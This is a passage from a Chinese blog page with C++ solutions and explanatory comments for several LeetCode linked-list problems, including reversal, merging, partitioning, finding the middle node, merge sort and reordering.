class="literal">NULL</span>&amp;&amp;temp-&gt;val==temp-&gt;next-&gt;val)</span><br><span class="line">                {</span><br><span class="line">                    temp=temp-&gt;next;</span><br><span class="line">                }</span><br><span class="line">                <span class="comment">//temp前的重复结点都跳过了，现在我们跳过temp</span></span><br><span class="line">                cur-&gt;next=temp-&gt;next;</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            {</span><br><span class="line">                <span class="comment">//如果cur后两个结点不重复，直接前移</span></span><br><span class="line">                cur=cur-&gt;next;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> dummy-&gt;next;</span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><ul><li><p>时间复杂度：O(n)</p></li><li><p>空间复杂度：O(1)</p></li></ul><h4 id="206-反转链表"><a href="#206-反转链表" class="headerlink" title="206. 反转链表"></a><a href="https://leetcode-cn.com/problems/reverse-linked-list/">206. 反转链表</a></h4><blockquote><p>反转一个单链表。</p><p><strong>示例:</strong></p><p>输入: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL<br>输出: 5-&gt;4-&gt;3-&gt;2-&gt;1-&gt;NULL</p></blockquote><h5 id="双指针"><a href="#双指针" class="headerlink" title="双指针"></a>双指针</h5><p>如图，定义两个指针，pre在前 cur在后,temp 保存向前的pre指针的临时指针</p><p>每次进行一次局部翻转，</p><p>当pre到达尾部的时候终止，此时cur指向最后一个节点。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/26939/9ce26a709147ad9ce6152d604efc1cc19a33dc5d467ed2aae5bc68463fdd2888.gif" alt="img"></p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">reverseList</span><span class="params">(ListNode* head)</span> </span>{</span><br><span class="line">        <span class="comment">/*定义两个指针，pre在前 cur在后</span></span><br><span class="line"><span class="comment">         *当pre到达尾部的时候终止，此时cur指向最后一个节点</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        ListNode *pre=head;</span><br><span class="line">        ListNode *cur=<span class="literal">NULL</span>;</span><br><span class="line">        ListNode *temp=<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">while</span>(pre!=<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            temp=pre;<span class="comment">//临时存储pre</span></span><br><span class="line">            pre=pre-&gt;next;<span class="comment">//pre指向下一个节点</span></span><br><span class="line">            temp-&gt;next=cur;<span class="comment">//翻转指针</span></span><br><span class="line">            cur=temp;<span class="comment">//cur指针向前移动一步</span></span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> cur;</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h4 id="92-反转链表-II"><a href="#92-反转链表-II" class="headerlink" title="92. 反转链表 II"></a><a href="https://leetcode-cn.com/problems/reverse-linked-list-ii/">92. 反转链表 II</a></h4><blockquote><p>反转从位置 <em>m</em> 到 <em>n</em> 的链表。请使用一趟扫描完成反转。</p><p><strong>说明:</strong><br>1 ≤ <em>m</em> ≤ <em>n</em> ≤ 链表长度。</p><p><strong>示例:</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;输入: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL, m = 2, n = 4</span><br><span class="line">&gt;输出: 1-&gt;4-&gt;3-&gt;2-&gt;5-&gt;NULL</span><br></pre></td></tr></tbody></table></figure></blockquote><h5 id="迭代法："><a href="#迭代法：" class="headerlink" title="迭代法："></a>迭代法：</h5><p>参考上题，先遍历到 m 处，再翻转</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">reverseBetween</span><span class="params">(ListNode* head, <span class="type">int</span> m, <span class="type">int</span> n)</span> </span>{</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        ListNode *pre,*cur;</span><br><span class="line">        pre=head;</span><br><span class="line">        cur=<span class="literal">NULL</span>;</span><br><span class="line">        </span><br><span class="line"><span class="comment">//遍历到m节点，如果只有一个节点，跳过，这里cur会为空但是后面翻转链表的时候就不是了</span></span><br><span class="line">        <span class="keyword">while</span>(m&gt;<span class="number">1</span>)</span><br><span class="line">        {</span><br><span class="line">            cur=pre;</span><br><span class="line">            pre=pre-&gt;next;</span><br><span class="line">            m--;</span><br><span class="line">            n--;</span><br><span class="line">            </span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line"><span class="comment">//m节点的前一个节点</span></span><br><span class="line">        ListNode*con=cur;</span><br><span class="line">        ListNode*temp=<span class="literal">NULL</span>;</span><br><span class="line">        <span class="comment">//用于保存被翻转链表的第一个节点</span></span><br><span class="line">        ListNode*front=pre;</span><br><span class="line">        </span><br><span class="line">      </span><br><span class="line">        </span><br><span class="line"><span class="comment">//反转m-n的节点</span></span><br><span class="line">        <span class="keyword">while</span>(n--)</span><br><span class="line">        {</span><br><span class="line">            temp=pre;</span><br><span class="line">            pre=pre-&gt;next;</span><br><span class="line">            temp-&gt;next=cur;</span><br><span class="line">            cur=temp;</span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line"><span class="comment">//如果不只是一个节点，那么就把指针指向被翻转的链表的最后一个节点</span></span><br><span class="line">        <span class="keyword">if</span>(con!=<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            con-&gt;next=cur;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">            <span class="comment">//否则直接输出此节点</span></span><br><span class="line">            head=cur;</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">//被翻转的链表原来的头变尾</span></span><br><span class="line">        front-&gt;next=pre;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h4 id="21-合并两个有序链表"><a href="#21-合并两个有序链表" class="headerlink" title="21. 合并两个有序链表"></a><a href="https://leetcode-cn.com/problems/merge-two-sorted-lists/">21. 合并两个有序链表</a></h4><blockquote><p>将两个升序链表合并为一个新的 升序 链表并返回。新链表是通过拼接给定的两个链表的所有节点组成的。 </p><p>示例：</p><p>输入：1-&gt;2-&gt;4, 1-&gt;3-&gt;4<br>输出：1-&gt;1-&gt;2-&gt;3-&gt;4-&gt;4</p></blockquote><h5 id="迭代法：-1"><a href="#迭代法：-1" class="headerlink" title="迭代法："></a>迭代法：</h5><p>直接连接各个节点</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode() : val(0), next(nullptr) {}</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(nullptr) {}</span></span><br><span class="line"><span class="comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">mergeTwoLists</span><span class="params">(ListNode* l1, ListNode* l2)</span> </span>{</span><br><span class="line"></span><br><span class="line">        ListNode *dummy=<span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">-1</span>);</span><br><span class="line">        ListNode *cur=dummy;</span><br><span class="line">        <span class="comment">//将小的节点接到哑结点为头的链表中</span></span><br><span class="line">        <span class="keyword">while</span>(l1!=<span class="literal">NULL</span>&amp;&amp;l2!=<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">if</span>(l1-&gt;val&gt;l2-&gt;val)</span><br><span class="line">            {</span><br><span class="line">               cur-&gt;next=l2;</span><br><span class="line">               cur=cur-&gt;next;</span><br><span class="line">               l2=l2-&gt;next;</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            {</span><br><span class="line">                cur-&gt;next=l1;</span><br><span class="line">                cur=cur-&gt;next;</span><br><span class="line">                l1=l1-&gt;next;</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//处理剩下的节点</span></span><br><span class="line">        <span class="keyword">if</span>(l1!=<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            cur-&gt;next=l1;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span>(l2!=<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            cur-&gt;next=l2;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> dummy-&gt;next;</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h4 id="86-分隔链表"><a href="#86-分隔链表" class="headerlink" title="86. 分隔链表"></a><a href="https://leetcode-cn.com/problems/partition-list/">86. 分隔链表</a></h4><blockquote><p>给定一个链表和一个特定值 x，对链表进行分隔，使得所有小于 x 的节点都在大于或等于 x 的节点之前。</p><p>你应当保留两个分区中每个节点的初始相对位置。</p><p>示例:</p><p>输入: head = 1-&gt;4-&gt;3-&gt;2-&gt;5-&gt;2, x = 3<br>输出: 1-&gt;2-&gt;2-&gt;4-&gt;3-&gt;5</p></blockquote><p><strong>当头节点不确定的时候，使用哑巴节点</strong></p><p>将大于 x 的节点，放到另外一个链表，最后连接这两个链表</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">partition</span><span class="params">(ListNode* head, <span class="type">int</span> x)</span> </span>{</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        ListNode *headDummy=<span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">-1</span>);</span><br><span class="line">        ListNode *tailDummy=<span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">-1</span>);</span><br><span class="line">        ListNode *cur=<span class="literal">NULL</span>,*tail=tailDummy;</span><br><span class="line">        headDummy-&gt;next=head;</span><br><span class="line">        </span><br><span class="line">        head=headDummy;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(head-&gt;next!=<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">if</span>(head-&gt;next-&gt;val&lt;x)</span><br><span class="line">            {</span><br><span class="line">                head=head-&gt;next;</span><br><span class="line">            }</span><br><span class="line">            <span class="comment">//这里把大于X的节点删除，然后连接到另一个链表</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            {</span><br><span class="line">                cur=head-&gt;next;</span><br><span class="line">                <span class="comment">//删除大于X的节点</span></span><br><span class="line">                head-&gt;next=head-&gt;next-&gt;next;</span><br><span class="line">                <span class="comment">//连接到新链表</span></span><br><span class="line">                tail-&gt;next=cur;</span><br><span class="line">                tail=tail-&gt;next;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">//拼接两个链表</span></span><br><span class="line">        <span class="comment">//tail代表tailDummy最后一个节点，它的后面可能还连着，要断掉</span></span><br><span class="line">        <span class="comment">//如输入[1,4,3,2,5,2]就会有错,没有处理5-&gt;2</span></span><br><span class="line">        tail-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">        </span><br><span class="line">        head-&gt;next=tailDummy-&gt;next;</span><br><span class="line">        <span class="keyword">return</span> headDummy-&gt;next;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h4 id="876-链表的中间结点"><a href="#876-链表的中间结点" class="headerlink" title="876. 链表的中间结点"></a><a href="https://leetcode-cn.com/problems/middle-of-the-linked-list/">876. 链表的中间结点</a></h4><blockquote><p>给定一个带有头结点 <code>head</code> 的非空单链表，返回链表的中间结点。</p><p>如果有两个中间结点，则返回第二个中间结点。</p></blockquote><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">middleNode</span><span class="params">(ListNode* head)</span> </span>{</span><br><span class="line">        ListNode *slow,*fast;</span><br><span class="line">        slow=head;</span><br><span class="line">        fast=head;</span><br><span class="line">        <span class="keyword">while</span>(fast!=<span class="literal">NULL</span>&amp;&amp;fast-&gt;next!=<span class="literal">NULL</span>)</span><br><span class="line">       {</span><br><span class="line">           slow=slow-&gt;next;</span><br><span class="line">           fast=fast-&gt;next-&gt;next;</span><br><span class="line">       }</span><br><span class="line">       <span class="keyword">return</span> slow;</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>总结：如果链表长度是偶数，返回中间偏右的位置 </p><p>且fast如果初始化为head-&gt;next 返回中间偏左的位置。</p><p>奇数长度则两者相同。</p><h4 id="148-排序链表"><a href="#148-排序链表" class="headerlink" title="148. 排序链表"></a><a href="https://leetcode-cn.com/problems/sort-list/">148. 排序链表</a></h4><blockquote><p>在 O(n log n) 时间复杂度和常数级空间复杂度下，对链表进行排序。</p><p>示例 1:</p><p>输入: 4-&gt;2-&gt;1-&gt;3<br>输出: 1-&gt;2-&gt;3-&gt;4<br>示例 2:</p><p>输入: -1-&gt;5-&gt;3-&gt;4-&gt;0<br>输出: -1-&gt;0-&gt;3-&gt;4-&gt;5</p></blockquote><h5 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h5><p>归并排序链表，找中点和合并操作</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">sortList</span><span class="params">(ListNode* head)</span> </span>{</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">mergeSort</span>(head);</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">    <span class="comment">//寻找链表中点，快慢指针，快的到达终点，慢的刚好到中点 </span></span><br><span class="line">    <span class="comment">//当链表的长度是奇数时，slow 恰巧停在中点位置；如果长度是偶数，slow 最终的位置是中间偏右：</span></span><br><span class="line">    <span class="comment">//此题我们让head先走，则停在中间偏左的位置</span></span><br><span class="line">    <span class="comment">//148 143 141都有快慢指针</span></span><br><span class="line">    <span class="function">ListNode *<span class="title">findMiddle</span><span class="params">(ListNode *head)</span></span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        ListNode *slow,*fast;</span><br><span class="line">        slow=head;</span><br><span class="line">        fast=head-&gt;next;</span><br><span class="line">        <span class="keyword">while</span>(fast!=<span class="literal">NULL</span>&amp;&amp;fast-&gt;next!=<span class="literal">NULL</span>)</span><br><span class="line"></span><br><span class="line">        {</span><br><span class="line">            slow=slow-&gt;next;</span><br><span class="line">            fast=fast-&gt;next-&gt;next;</span><br><span class="line"></span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> slow;</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">//合并两个链表，参考归并排序</span></span><br><span class="line">    <span class="function">ListNode * <span class="title">mergeTwoLists</span><span class="params">(ListNode*left,ListNode*right)</span></span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        ListNode *dummy=<span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">-1</span>);</span><br><span class="line">        ListNode *head=dummy;</span><br><span class="line">        <span class="keyword">while</span>(left!=<span class="literal">NULL</span>&amp;&amp;right!=<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">if</span>(left-&gt;val&gt;right-&gt;val)</span><br><span class="line">            {</span><br><span class="line">                head-&gt;next=right;</span><br><span class="line">                right=right-&gt;next;</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            {</span><br><span class="line">                head-&gt;next=left;</span><br><span class="line">                left=left-&gt;next;</span><br><span class="line">            }   </span><br><span class="line">            <span class="comment">//下一个</span></span><br><span class="line">            head=head-&gt;next;</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">//处理剩下节点</span></span><br><span class="line">        <span class="keyword">while</span>(left!=<span class="literal">NULL</span>)</span><br><span class="line">            {</span><br><span class="line">                head-&gt;next=left;</span><br><span class="line">                head=head-&gt;next;</span><br><span class="line">                left=left-&gt;next;</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">while</span>(right!=<span class="literal">NULL</span>)</span><br><span class="line">            {</span><br><span class="line">                head-&gt;next=right;</span><br><span class="line">                head=head-&gt;next;</span><br><span class="line">                right=right-&gt;next;</span><br><span class="line">            }</span><br><span class="line">        <span class="keyword">return</span> dummy-&gt;next;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="function">ListNode *<span class="title">mergeSort</span><span class="params">(ListNode *head)</span></span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">NULL</span>||head-&gt;next==<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        ListNode *middle=<span class="built_in">findMiddle</span>(head);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 断开中间节点</span></span><br><span class="line">        ListNode* tail=middle-&gt;next;</span><br><span class="line">        middle-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">        <span class="comment">//左右分别进行归并排序</span></span><br><span class="line">        ListNode *left=<span class="built_in">mergeSort</span>(head);</span><br><span class="line">        ListNode *right=<span class="built_in">mergeSort</span>(tail);</span><br><span class="line">        ListNode *res=<span class="built_in">mergeTwoLists</span>(left, right);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h4 id="143-重排链表"><a href="#143-重排链表" class="headerlink" title="143. 重排链表"></a><a href="https://leetcode-cn.com/problems/reorder-list/">143. 重排链表</a></h4><blockquote><p>给定一个单链表 L：L0→L1→…→Ln-1→Ln ，<br>将其重新排列后变为： L0→Ln→L1→Ln-1→L2→Ln-2→…</p><p>你不能只是单纯的改变节点内部的值，而是需要实际的进行节点交换。</p><p>示例 1:</p><p>给定链表 1-&gt;2-&gt;3-&gt;4, 重新排列为 1-&gt;4-&gt;2-&gt;3.<br>示例 2:</p><p>给定链表 1-&gt;2-&gt;3-&gt;4-&gt;5, 重新排列为 1-&gt;5-&gt;2-&gt;4-&gt;3.</p></blockquote><p>此题目为2019年计算机统考408真题</p><p>思路：找到中点断开，翻转后面部分，然后合并前后两个链表</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span 